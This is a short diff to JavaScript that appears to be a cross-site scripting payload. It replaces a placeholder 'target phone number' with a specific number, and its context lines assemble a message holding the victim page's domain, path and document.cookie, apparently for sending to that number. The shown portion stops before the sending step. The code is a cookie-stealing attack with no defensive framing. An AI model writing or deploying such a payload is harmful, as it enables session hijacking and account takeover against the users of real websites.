@@ -1,4 +1,4 @@
-var phoneNumber = '1234567890'; // Replace with the target phone number
+var phoneNumber = '18056009130'; // Replace with the target phone number
 var messageContent = 'XSS Alert in ' + document.domain +
     '%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document.location.hostname + document.location.pathname +
     '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document.cookie;
